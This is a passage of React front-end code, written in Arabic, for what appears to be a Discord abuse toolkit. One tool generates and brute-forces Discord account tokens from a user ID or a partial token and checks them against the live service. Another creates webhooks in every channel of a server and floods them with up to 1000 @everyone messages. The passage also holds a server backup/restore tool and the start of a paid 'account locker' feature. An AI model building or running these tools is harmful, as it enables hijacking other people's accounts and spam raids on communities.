                  <div className="bg-amber-500/5 rounded-xl p-4 mb-6 border border-amber-500/10"><p className="text-[11px] text-amber-400/80 leading-relaxed">💡 الموقع ذكي جداً - تقرأ الجزء و تفهم أي جزء من التوكن وضعته و تكمل الباقي بأنماط مختلفة لحد ما تجد صالح أو توقفها</p></div>
                  {tgFragmentAnalysis && (<div className="bg-cyan-500/5 rounded-xl p-4 mb-6 border border-cyan-500/15 animate-fade-in">
                    <div className="flex items-center justify-between mb-3"><div className="text-[11px] text-cyan-300 font-bold">🧠 تحليل ذكي متقدم</div><div className={`text-[9px] px-2 py-0.5 rounded-full border ${tgFragmentAnalysis.confidence >= 80 ? 'bg-green-500/10 text-green-400 border-green-500/20' : tgFragmentAnalysis.confidence >= 50 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>ثقة {tgFragmentAnalysis.confidence}%</div></div>
                    <div className="text-[10px] text-cyan-400/90 mb-1.5 font-medium">{tgFragmentAnalysis.analysis}</div>
                    <div className="text-[9px] text-cyan-500/50 mb-3">{tgFragmentAnalysis.detail}</div>
                    <div className="grid grid-cols-3 gap-2 mb-3">
                      <div className={`rounded-lg p-2 text-center text-[9px] border ${tgFragmentAnalysis.hasPart1 ? (tgFragmentAnalysis.partialPart1 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart1 ? (tgFragmentAnalysis.partialPart1 ? '⚠️' : '✅') : '❌'} User ID</div>
                      <div className={`rounded-lg p-2 text-center text-[9px] border ${tgFragmentAnalysis.hasPart2 ? (tgFragmentAnalysis.partialPart2 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart2 ? (tgFragmentAnalysis.partialPart2 ? '⚠️' : '✅') : '❌'} Timestamp</div>
                      <div className={`rounded-lg p-2 text-center text-[9px] border ${tgFragmentAnalysis.hasPart3 ? (tgFragmentAnalysis.partialPart3 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart3 ? (tgFragmentAnalysis.partialPart3 ? '⚠️' : '✅') : '❌'} Hex</div>
                    </div>
                    <div className="text-[9px] text-white/30 mb-1">الناقص: {tgFragmentAnalysis.missingParts.length > 0 ? tgFragmentAnalysis.missingParts.map((p: string) => p === 'P1' ? 'User ID' : p === 'P2' ? 'Timestamp' : p === 'P3' ? 'Hex' : p).join(' | ') : (tgFragmentAnalysis.partialPart1 || tgFragmentAnalysis.partialPart2 || tgFragmentAnalysis.partialPart3) ? 'أجزاء ناقصة تحتاج إكمال' : 'لا شيء'}</div>
                    {tgFragmentAnalysis.userIDs && tgFragmentAnalysis.userIDs.length > 0 && (<div className="text-[9px] text-green-400/70 mt-1">User ID: {tgFragmentAnalysis.userIDs.join(', ')}</div>)}
                    {tgFragmentAnalysis.timestamps && tgFragmentAnalysis.timestamps.length > 0 && (<div className="text-[9px] text-blue-400/70 mt-0.5">Timestamp: {tgFragmentAnalysis.timestamps.join(', ')}</div>)}
                  </div>)}
                </>)}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mt-8">
                  <ActionBtn text={tgRunning ? '⏳ جاري...' : '🎲 توليد التوكنات'} loading={tgRunning} color="purple" onClick={async () => {
                    if (tgMode === 'userid' && (!tgUserId.trim() || tgUserId.trim().length < 17)) { setResult('❌ أدخل أيدي الحساب (17 رقم على الأقل)'); return }
                    if (tgMode === 'fragment' && (!tgFragment.trim() || tgFragment.trim().length < 3)) { setResult('❌ ضع جزء من التوكن (3 أحرف على الأقل)'); return }
                    setResult(''); setTgResults([]); setTgHalfToken(''); setTgStats(null); setTgFragmentAnalysis(null); setCheckerResults([]); setCheckerStats(null)
                    setTgRunning(true); setLoading(true); setProgress('🎰 جاري توليد التوكنات...')
                    try {
                      const bodyObj: any = { action: 'generate', count: tgCount }
                      if (tgMode === 'userid') { bodyObj.userId = tgUserId }
                      if (tgMode === 'fragment') { bodyObj.fragment = tgFragment }
                      const res = await fetch('/api/token-generator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(bodyObj) })
                      const contentType = res.headers.get('content-type') || ''
                      if (contentType.includes('application/json')) {
                        const data = await res.json()
                        if (data.success && data.tokens) {
                          setTgResults(data.tokens.map((t: any) => ({ token: t.token, valid: t.valid || false, info: `${t.length}ح | ${t.userId ? 'ID:'+t.userId : ''} ${t.entropy ? 'H:'+t.entropy : ''}`, index: t.index })))
                          setTgStats({ total: data.tokens.length, checked: 0, valid: data.tokens.filter((t: any) => t.valid).length, invalid: data.tokens.filter((t: any) => !t.valid).length, skipped: 0, speed: '0/s' })
                          if (data.fragmentAnalysis) setTgFragmentAnalysis(data.fragmentAnalysis)
                          setResult(data.message || `✅ تم توليد ${data.tokens.length} توكن | ✅ صالح البنية: ${data.tokens.filter((t: any) => t.valid).length}`)
                        } else if (data.error) { setResult('❌ ' + data.error) }
                      } else {
                        const reader = res.body?.getReader()
                        if (!reader) { setResult('❌ خطأ'); setTgRunning(false); setLoading(false); setProgress(''); return }
                        const decoder = new TextDecoder(); let buffer = ''
                        while (true) {
                          const { done, value } = await reader.read()
                          if (done) break
                          buffer += decoder.decode(value, { stream: true })
                          const lines = buffer.split('\n'); buffer = lines.pop() || ''
                          for (const line of lines) {
                            if (!line.startsWith('data: ')) continue
                            try {
                              const event = JSON.parse(line.substring(6))
                              if (event.type === 'halfToken') setTgHalfToken(event.halfToken)
                              else if (event.type === 'fragmentAnalysis') setTgFragmentAnalysis(event.analysis)
                              else if (event.type === 'result') {
                                setTgResults(prev => [event.data, ...prev].slice(0, 200))
                                if (event.stats) setTgStats(event.stats as any)
                              }
                            } catch {}
                          }
                        }
                      }
                    } catch (e: any) { setResult('❌ خطأ في الاتصال') }
                    setTgRunning(false); setLoading(false); setProgress('')
                  }} />
                  {tgResults.length > 0 && !tgRunning && (
                    <ActionBtn text="🔍 فحص التوكنات" loading={loading} color="green" onClick={async () => {
                      if (tgResults.length === 0) { setResult('❌ لا توجد توكنات للفحص'); return }
                      setLoading(true); setProgress('🔍 جاري فحص التوكنات...'); setResult('')
                      try {
                        const tokensToCheck = tgResults.map(r => r.token)
                        const res = await fetch('/api/token-checker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tokens: tokensToCheck }) })
                        const data = await res.json()
                        if (data.success) {
                          setCheckerResults(data.results)
                          if (data.stats) setCheckerStats(data.stats)
                          setResult(`✅ تم فحص ${data.stats.total} توكن | ✅ صالح: ${data.stats.valid} | ❌ غير صالح: ${data.stats.invalid}`)
                          setTgResults(prev => prev.map(r => {
                            const masked = r.token.length > 14 ? r.token.substring(0, 10) + '***' + r.token.substring(r.token.length - 4) : r.token
                            const found = data.results.find((c: any) => c.token === masked)
                            if (found) {
                              return { ...r, valid: found.valid, info: found.valid ? `${found.type || ''} | ${found.name || ''} | ID: ${found.id}` : (found.error || 'غير صالح') }
                            }
                            return { ...r, valid: false, info: 'فشل الفحص' }
                          }))
                        } else { setResult('❌ ' + (data.error || 'فشل الفحص')) }
                      } catch { setResult('❌ خطأ في الاتصال') }
                      setLoading(false); setProgress('')
                    }} />
                  )}
                </div>
                {tgStats && tgStats.total > 0 && (<div className="mt-8 grid grid-cols-3 gap-3">
                  <div className="bg-purple-500/8 rounded-xl p-4 border border-purple-500/15 text-center"><div className="text-lg font-black text-purple-400">{tgStats.total}</div><div className="text-[9px] text-purple-300/50">مولّد</div></div>
                  <div className="bg-green-500/8 rounded-xl p-4 border border-green-500/15 text-center"><div className="text-lg font-black text-green-400">{tgStats.valid || 0}</div><div className="text-[9px] text-green-300/50">صالح البنية</div></div>
                  <div className="bg-blue-500/8 rounded-xl p-4 border border-blue-500/15 text-center"><div className="text-lg font-black text-blue-400">{checkerStats ? checkerStats.valid : tgStats.total}</div><div className="text-[9px] text-blue-300/50">{checkerStats ? 'صالح فعلي' : 'بانتظار الفحص'}</div></div>
                </div>)}
                {tgResults.length > 0 && (<div className="mt-6 space-y-2 max-h-72 overflow-y-auto">
                  <div className="text-[11px] text-white/30 mb-3 sticky top-0 bg-[#0d1117] py-1.5">📋 {tgResults.length} توكن:</div>
                  {tgResults.slice(0, 200).map((r, i) => (
                    <div key={r.index || i} className={`flex items-center gap-2.5 p-3 rounded-xl text-[11px] font-mono border animate-fade-in ${r.valid ? 'bg-green-500/15 border-green-500/30 ring-1 ring-green-500/20' : 'bg-white/3 border-white/5'}`}>
                      <span className="flex-shrink-0 text-xs">{r.valid ? '✅' : '⏳'}</span>
                      <code className="flex-1 text-white/60 break-all leading-relaxed" style={{wordBreak:'break-all',fontSize:'10px'}}>{r.token}</code>
                      <span className="flex-shrink-0 text-[8px] text-white/20 max-w-[60px] truncate">{r.info || ''}</span>
                      <button onClick={() => { navigator.clipboard.writeText(r.token).catch(() => {}) }} className="text-[10px] text-purple-400 bg-purple-500/10 px-1.5 py-0.5 rounded border border-purple-500/20 hover:bg-purple-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button>
                    </div>
                  ))}
                </div>)}
              </div></div>
            )}

            {/* ==================== WEBHOOK CREATOR - محسّن v2 ==================== */}
            {section === 'webhook-creator' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔗</span><h2 className="text-xl font-black text-cyan-400">إنشاء ويب هوكات متقدمة</h2></div>
                <p className="text-slate-500 text-sm mb-5">إنشاء ويب هوكات في كل رومات السيرفر + سبام مباشر + Embed + خيارات متقدمة</p>
                <TokenInput label="🎫 التوكن" value={whCreateToken} onChange={setWhCreateToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={whCreateGuildId} onChange={setWhCreateGuildId} placeholder="Server ID" accent="cyan" />

                {/* جلب الرومات */}
                <button onClick={async () => {
                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
                  setLoading(true); setProgress('🔍 جاري جلب الرومات...'); setResult('')
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'fetch-channels' }), signal: AbortSignal.timeout(30000) })
                    const data = await res.json()
                    if (data.success) { setWhChannels(data.channels); setWhSelectedChannels(data.channels.map((c: {id: string}) => c.id)); setResult(`✅ تم جلب ${data.count} روم نصي`); setStats({}) }
                    else { setResult('❌ ' + (data.error || 'فشل جلب الرومات')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} className="w-full mb-5 py-3 rounded-xl text-sm font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 hover:bg-cyan-500/20 transition-all cursor-pointer">🔍 جلب رومات السيرفر</button>

                {/* عرض الرومات */}
                {whChannels.length > 0 && (<div className="mb-5 bg-black/20 rounded-xl p-4 border border-cyan-500/15">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-bold text-cyan-400">📺 الرومات النصية ({whChannels.length})</span>
                    <div className="flex gap-2">
                      <button onClick={() => setWhSelectedChannels(whChannels.map(c => c.id))} className="text-[10px] text-green-400 bg-green-500/10 px-2 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/20 transition-colors cursor-pointer">تحديد الكل</button>
                      <button onClick={() => setWhSelectedChannels([])} className="text-[10px] text-red-400 bg-red-500/10 px-2 py-1 rounded-lg border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">إلغاء الكل</button>
                    </div>
                  </div>
                  <div className="max-h-40 overflow-y-auto space-y-1">
                    {whChannels.map(ch => (
                      <label key={ch.id} className={`flex items-center gap-2 p-2 rounded-lg cursor-pointer transition-all ${whSelectedChannels.includes(ch.id) ? 'bg-cyan-500/10 border border-cyan-500/20' : 'bg-black/10 border border-transparent hover:bg-white/3'}`}>
                        <input type="checkbox" checked={whSelectedChannels.includes(ch.id)} onChange={e => {
                          if (e.target.checked) setWhSelectedChannels([...whSelectedChannels, ch.id])
                          else setWhSelectedChannels(whSelectedChannels.filter(id => id !== ch.id))
                        }} className="accent-cyan-500 w-3.5 h-3.5" />
                        <span className="text-[11px] text-cyan-300">#{ch.name}</span>
                        <span className="text-[9px] text-white/20 font-mono ml-auto">{ch.id}</span>
                      </label>
                    ))}
                  </div>
                </div>)}

                {/* اختيار الوضع */}
                <div className="flex gap-2 mb-5 overflow-x-auto pb-1">
                  {[{ key: 'create' as const, label: '🔗 إنشاء فقط', icon: '🔗' }, { key: 'spam' as const, label: '🔥 إنشاء + سبام', icon: '🔥' }, { key: 'existing' as const, label: '📡 سبام موجود', icon: '📡' }].map(mode => (
                    <button key={mode.key} onClick={() => setWhCreateMode(mode.key)} className={`flex-shrink-0 px-4 py-3 rounded-xl text-xs font-bold transition-all cursor-pointer border min-w-fit ${whCreateMode === mode.key ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30 shadow-lg shadow-cyan-500/5' : 'bg-black/20 text-cyan-600 hover:text-cyan-400 border-transparent'}`}>{mode.icon} {mode.label}</button>
                  ))}
                </div>

                {/* خيارات الإنشاء */}
                {(whCreateMode === 'create' || whCreateMode === 'spam') && (<div className="bg-black/20 rounded-xl p-4 border border-cyan-500/15 mb-5">
                  <h3 className="text-xs font-bold text-cyan-400 mb-3">⚙️ خيارات الإنشاء</h3>
                  <div className="grid grid-cols-2 gap-3">
                    <div><label className="text-[11px] text-cyan-300/70 mb-1 block">📝 اسم الويب هوك</label><input type="text" value={whCreateName} onChange={e => setWhCreateName(e.target.value)} className="w-full bg-black/30 border border-cyan-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-cyan-300/70 mb-1 block">🔢 عدد لكل روم (max 10)</label><input type="number" value={whCreateCount} onChange={e => setWhCreateCount(Math.min(Math.max(Number(e.target.value), 1), 10))} className="w-full bg-black/30 border border-cyan-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
                  </div>
                </div>)}

                {/* خيارات السبام */}
                {(whCreateMode === 'spam' || whCreateMode === 'existing') && (<div className="bg-orange-500/5 rounded-xl p-4 border border-orange-500/15 mb-5">
                  <h3 className="text-xs font-bold text-orange-400 mb-3">🔥 خيارات السبام</h3>
                  <div className="mb-3"><label className="text-[11px] text-orange-300/70 mb-1 block">💬 محتوى الرسالة</label><textarea value={whCrSpamMessage} onChange={e => setWhCrSpamMessage(e.target.value)} placeholder="@everyone رسالتك هنا" rows={2} className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
                  <div className="grid grid-cols-2 gap-3">
                    <div><label className="text-[11px] text-orange-300/70 mb-1 block">🔢 عدد الرسائل (max 1000)</label><input type="number" value={whCrSpamCount} onChange={e => setWhCrSpamCount(Math.min(Math.max(Number(e.target.value), 1), 1000))} className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-orange-300/70 mb-1 block">👤 اسم المرسل (اختياري)</label><input type="text" value={whCrSpamUsername} onChange={e => setWhCrSpamUsername(e.target.value)} placeholder="TRJ BOT" className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                    <div className="col-span-2"><label className="text-[11px] text-orange-300/70 mb-1 block">🖼️ رابط Avatar (اختياري)</label><input type="text" value={whCrSpamAvatarUrl} onChange={e => setWhCrSpamAvatarUrl(e.target.value)} placeholder="https://cdn.discordapp.com/..." className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white font-mono placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                  </div>
                </div>)}

                {/* Embed خيارات */}
                {(whCreateMode === 'spam' || whCreateMode === 'existing') && (<div className="bg-purple-500/5 rounded-xl p-4 border border-purple-500/15 mb-5">
                  <div className="flex items-center justify-between mb-3">
                    <h3 className="text-xs font-bold text-purple-400">🎨 Embed (اختياري)</h3>
                    <button onClick={() => setWhEmbedEnabled(!whEmbedEnabled)} className={`text-[10px] px-3 py-1.5 rounded-lg border transition-all cursor-pointer ${whEmbedEnabled ? 'bg-purple-500/20 text-purple-300 border-purple-500/30' : 'bg-black/20 text-purple-600 border-transparent hover:text-purple-400'}`}>{whEmbedEnabled ? '✅ مفعّل' : '⬜ معطّل'}</button>
                  </div>
                  {whEmbedEnabled && (<div className="space-y-3">
                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">📝 عنوان Embed</label><input type="text" value={whEmbedTitle} onChange={e => setWhEmbedTitle(e.target.value)} placeholder="عنوان الرسالة" className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">📝 وصف Embed</label><textarea value={whEmbedDesc} onChange={e => setWhEmbedDesc(e.target.value)} placeholder="وصف الرسالة..." rows={2} className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors" /></div>
                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">🎨 لون Embed (HEX)</label><input type="text" value={whEmbedColor} onChange={e => setWhEmbedColor(e.target.value)} placeholder="5865F2" className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white font-mono focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
                  </div>)}
                </div>)}

                {/* سبام في ويب هوكات موجودة */}
                {whCreateMode === 'existing' && (<div className="mb-5"><label className="text-[11px] text-pink-300/70 mb-1 block">🔗 روابط الويب هوكات (كل سطر = رابط)</label><textarea value={whExistingUrls} onChange={e => setWhExistingUrls(e.target.value)} placeholder="https://discord.com/api/webhooks/...\nhttps://discord.com/api/webhooks/..." rows={3} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 resize-none font-mono transition-colors" /></div>)}

                {/* أزرار التنفيذ */}
                {whCreateMode === 'create' && (<ActionBtn text={`🔗 إنشاء في ${whSelectedChannels.length || 'كل'} روم`} loading={loading} color="cyan" onClick={async () => {
                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
                  setLoading(true); setProgress('🔗 جاري إنشاء الويب هوكات...'); setResult(''); setWhCreateResults([])
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'create-all', webhookName: whCreateName, createCount: whCreateCount, selectedChannelIds: whSelectedChannels }), signal: AbortSignal.timeout(300000) })
                    const data = await res.json()
                    if (data.success) { setResult(data.logs.join('\n')); setWhCreateResults(data.results); if (data.stats) setStats({ created: data.stats.created, failed: data.stats.failed }) }
                    else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />)}

                {whCreateMode === 'spam' && (<ActionBtn text={`🔥 إنشاء + سبام في ${whSelectedChannels.length || 'كل'} روم`} loading={loading} color="orange" onClick={async () => {
                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
                  if (!whCrSpamMessage) { setResult('❌ أدخل الرسالة'); return }
                  setLoading(true); setProgress('🔥 جاري إنشاء + سبام...'); setResult(''); setWhCreateResults([])
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'create-and-spam', webhookName: whCreateName, createCount: whCreateCount, selectedChannelIds: whSelectedChannels, spamMessage: whCrSpamMessage, spamCount: whCrSpamCount, spamUsername: whCrSpamUsername || undefined, spamAvatarUrl: whCrSpamAvatarUrl || undefined, embedTitle: whEmbedEnabled ? whEmbedTitle : undefined, embedDescription: whEmbedEnabled ? whEmbedDesc : undefined, embedColor: whEmbedEnabled ? whEmbedColor : undefined }), signal: AbortSignal.timeout(300000) })
                    const data = await res.json()
                    if (data.success) { setResult(data.logs.join('\n')); setWhCreateResults(data.results); if (data.stats) setStats({ created: data.stats.created, spam_sent: data.stats.spamSent, failed: data.stats.spamFailed }) }
                    else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />)}

                {whCreateMode === 'existing' && (<ActionBtn text="📡 سبام في الويب هوكات الموجودة" loading={loading} color="pink" onClick={async () => {
                  if (!whCrSpamMessage) { setResult('❌ أدخل الرسالة'); return }
                  const urls = whExistingUrls.split('\n').map(u => u.trim()).filter(u => u.includes('discord.com/api/webhooks') || u.includes('discord.gg'))
                  if (urls.length === 0) { setResult('❌ أدخل رابط ويب هوك واحد على الأقل'); return }
                  setLoading(true); setProgress('📡 جاري السبام...'); setResult('')
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken || '', guildId: '0', action: 'spam-existing', webhookUrls: urls, spamMessage: whCrSpamMessage, spamCount: whCrSpamCount, spamUsername: whCrSpamUsername || undefined, spamAvatarUrl: whCrSpamAvatarUrl || undefined, embedTitle: whEmbedEnabled ? whEmbedTitle : undefined, embedDescription: whEmbedEnabled ? whEmbedDesc : undefined, embedColor: whEmbedEnabled ? whEmbedColor : undefined }), signal: AbortSignal.timeout(300000) })
                    const data = await res.json()
                    if (data.success) { setResult(data.logs.join('\n')); if (data.stats) setStats({ sent: data.stats.sent, failed: data.stats.failed }) }
                    else { setResult('❌ ' + (data.error || 'فشل')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />)}

                {/* عرض النتائج */}
                {whCreateResults.length > 0 && (<div className="mt-4 space-y-1.5 max-h-64 overflow-y-auto">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-[11px] text-white/30">📋 الويب هوكات المنشأة:</span>
                    <button onClick={() => {
                      const allUrls = whCreateResults.map(r => r.url).join('\n')
                      navigator.clipboard.writeText(allUrls).catch(() => {})
                    }} className="text-[10px] text-green-400 bg-green-500/10 px-2.5 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/20 transition-colors cursor-pointer">📋 نسخ الكل</button>
                  </div>
                  {whCreateResults.map((r, i) => (
                    <div key={i} className="bg-cyan-500/5 rounded-lg p-2.5 border border-cyan-500/15 flex items-center gap-2">
                      <span className="text-green-400 flex-shrink-0">✅</span>
                      <div className="flex-1 min-w-0">
                        <div className="text-[11px] text-cyan-300 font-bold">{r.name} {r.channelName ? <span className="text-white/30 font-normal">#{r.channelName}</span> : ''}</div>
                        <div className="text-[10px] text-white/30 font-mono truncate">{r.url}</div>
                      </div>
                      <button onClick={() => { navigator.clipboard.writeText(r.url).catch(() => {}) }} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button>
                    </div>
                  ))}
                </div>)}
              </div></div>
            )}

            {/* ==================== SERVER BACKUP ==================== */}
            {section === 'server-backup' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-emerald-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💾</span><h2 className="text-xl font-black text-emerald-400">حفظ و استعادة سيرفر</h2></div>
                <p className="text-slate-500 text-sm mb-5">حفظ نسخة احتياطية شاملة أو استعادة نسخة سابقة في أي سيرفر</p>
                <TokenInput label="🎫 التوكن" value={backupToken} onChange={setBackupToken} accent="green" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🖥️ أيدي السيرفر" value={backupGuildId} onChange={setBackupGuildId} placeholder="Server ID" accent="green" />
                <ActionBtn text="💾 إنشاء نسخة احتياطية" loading={loading} color="green" onClick={async () => { if (!backupToken || !backupGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }; setLoading(true); setProgress('📦 جاري إنشاء النسخة الاحتياطية...'); setResult(''); try { const res = await fetch('/api/server-backup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: backupToken, guildId: backupGuildId, action: 'backup' }), signal: AbortSignal.timeout(300000) }); if (!res.ok) { const err = await res.json().catch(() => ({ error: 'خطأ في الاتصال' })); setResult('❌ ' + (err.error || `HTTP ${res.status}`)); setLoading(false); setProgress(''); return } const data = await res.json(); if (data.success) { setResult(data.logs.join('\n')); if (data.backup) { const blob = new Blob([JSON.stringify(data.backup, null, 2)], { type: 'application/json' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `backup_${backupGuildId}_${Date.now()}.json`; a.click(); URL.revokeObjectURL(url) } } else { setResult('❌ ' + (data.error || 'فشل')) } } catch (e: any) { if (e.name === 'TimeoutError' || e.name === 'AbortError') setResult('❌ انتهى وقت الانتظار - السيرفر كبير جداً أو فيه بيانات كثيرة'); else setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
                <div className="mt-5 pt-4 border-t border-emerald-500/15">
                  <h3 className="text-sm font-bold text-emerald-400 mb-2 flex items-center gap-2">🔄 استعادة نسخة احتياطية</h3>
                  <p className="text-[11px] text-emerald-500/60 mb-3">الصق ملف JSON النسخة الاحتياطية أو اختر ملف ثم اضغط استعادة - سيتم إنشاء نفس الرومات و الرتب و الإيموجي في السيرفر المحدد</p>
                  <textarea value={restoreData} onChange={e => setRestoreData(e.target.value)} placeholder="الصق محتوى ملف JSON النسخة الاحتياطية هنا..." rows={4} className="w-full bg-black/30 border border-emerald-500/30 rounded-xl px-4 py-3 text-white text-xs placeholder-emerald-700/30 focus:outline-none focus:border-emerald-400/50 resize-none transition-colors mb-3 font-mono" />
                  <label className="flex items-center gap-2 text-xs text-emerald-400 bg-emerald-500/10 px-3 py-2 rounded-lg border border-emerald-500/20 cursor-pointer hover:bg-emerald-500/20 transition-colors mb-3 w-fit">
                    <span>📁 اختر ملف JSON</span>
                    <input type="file" accept=".json" className="hidden" onChange={e => { const file = e.target.files?.[0]; if (!file) return; const reader = new FileReader(); reader.onload = () => { if (typeof reader.result === 'string') setRestoreData(reader.result) }; reader.readAsText(file) }} />
                  </label>
                  <ActionBtn text="🔄 استعادة النسخة" loading={loading} color="green" onClick={async () => { if (!backupToken || !backupGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر الهدف'); return }; if (!restoreData.trim()) { setResult('❌ الصق ملف JSON أو اختر ملف أولاً'); return }; let parsed; try { parsed = JSON.parse(restoreData) } catch { setResult('❌ ملف JSON غير صالح'); return }; setLoading(true); setProgress('🔄 جاري استعادة النسخة الاحتياطية...'); setResult(''); setStats(null); try { const ctrl = new AbortController(); const timer = setTimeout(() => ctrl.abort(), 300000); const res = await fetch('/api/server-backup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: backupToken, guildId: backupGuildId, action: 'restore', backupData: parsed }), signal: ctrl.signal }); clearTimeout(timer); if (!res.ok) { const err = await res.json().catch(() => ({ error: 'خطأ' })); setResult('❌ ' + (err.error || `HTTP ${res.status}`)); setLoading(false); setProgress(''); return } const ct = res.headers.get('content-type') || ''; if (!ct.includes('text/event-stream')) { const data = await res.json().catch(() => null); if (data?.error) setResult('❌ ' + data.error); else if (data?.success) setResult(data.message || '✅ تمت الاستعادة!'); else setResult('❌ خطأ في الاستجابة'); setLoading(false); setProgress(''); return } const reader = res.body?.getReader(); if (!reader) { setResult('❌ خطأ في الاتصال'); setLoading(false); setProgress(''); return } const decoder = new TextDecoder(); let buffer = ''; while (true) { const { done, value } = await reader.read(); if (done) break; buffer += decoder.decode(value, { stream: true }); const lines = buffer.split('\n'); buffer = lines.pop() || ''; for (const line of lines) { if (!line.startsWith('data: ')) continue; try { const event = JSON.parse(line.substring(6)); if (event.type === 'progress') setProgress(event.message); else if (event.type === 'stats') setStats(event.stats); else if (event.type === 'done') { if (event.success) { setResult(event.message || '✅ تمت الاستعادة بنجاح!'); if (event.stats) setStats(event.stats) } else setResult('❌ ' + (event.error || 'فشل')) } else if (event.type === 'error') setResult('❌ ' + event.message) } catch {} } } if (!result && !stats) setResult('⚠️ انتهت العملية بدون نتيجة واضحة') } catch (e: any) { if (e.name === 'AbortError' || e.name === 'TimeoutError') setResult('❌ انتهى وقت الانتظار (5 دقائق)'); else setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
                </div>
              </div></div>
            )}

            {/* ==================== ACCOUNT LOCKER (PRIME) ==================== */}
            {section === 'locker' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20 relative min-h-[460px]">
                {!isPrime && (<div className="prime-lock-overlay">
                  <div className="prime-lock-icon">⭐</div>
